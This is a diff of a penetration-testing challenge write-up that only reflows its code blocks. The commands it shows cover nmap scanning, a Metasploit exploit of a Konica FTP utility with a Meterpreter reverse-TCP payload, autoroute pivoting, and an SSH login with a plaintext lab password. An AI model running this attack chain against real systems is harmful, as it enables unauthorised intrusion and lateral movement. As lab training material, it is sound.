@@ -6,6 +6,9 @@ For full executive report, see [PWNChallenge1_GabriellaAhn](https://github.com/h
 
     ``
     nmap -open 10.20.160.10-150
+    ``
+    
+    ``
     nmap -open 10.20.170.20-100
     ``
 
@@ -29,6 +32,9 @@ For full executive report, see [PWNChallenge1_GabriellaAhn](https://github.com/h
 
     ``
     search Konica
+    ``
+    
+    ``
     use exploit/windows/ftp/kmftp_utility_cwd
     ``
    
@@ -36,7 +42,13 @@ For full executive report, see [PWNChallenge1_GabriellaAhn](https://github.com/h
     
     ``
     set RHOST 10.20.160.41
+    ``
+    
+    ``
     set RPORT 21
+    ``
+    
+    ``
     set PAYLOAD windows/meterpreter/reverse_tcp
     ``
 
@@ -68,12 +80,18 @@ For full executive report, see [PWNChallenge1_GabriellaAhn](https://github.com/h
 
     ``
     run autoroute -s 10.20.170.0
+    ``
+    
+    ``
     run autoroute -p
+    ``
+    
+    ``
     background
     ``
     
 10.  Search ssh_login, to use the information from the SSH.bat.
-
+    
     ``
     search ssh_login
     ``
@@ -82,9 +100,21 @@ For full executive report, see [PWNChallenge1_GabriellaAhn](https://github.com/h
 
     ``
     use auxiliary/scanner/ssh/ssh_login
+    ``
+    
+    ``
     set USERNAME jill
+    ``
+    
+    ``
     set PASSWORD JillIs100%Awesome
+    ``
+    
+    ``
     set rhost 10.20.170.87
+    ``
+    
+    ``
     exploit
     ``
 
